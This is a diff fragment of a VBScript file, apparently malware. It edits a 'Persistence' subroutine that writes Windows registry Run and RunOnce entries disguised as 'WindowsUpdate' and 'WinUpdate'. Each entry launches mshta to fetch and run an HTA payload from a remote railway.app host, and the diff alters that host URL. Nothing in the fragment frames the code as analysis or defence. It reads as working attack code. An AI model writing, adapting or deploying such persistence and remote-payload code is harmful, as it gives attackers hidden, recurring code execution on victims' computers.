@@ -157,7 +157,7 @@ Sub PostRaw(text)
     Set h = Nothing
 End Sub
 Sub Persistence()
-    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/system.hta"
+    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/"
     On Error Resume Next
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
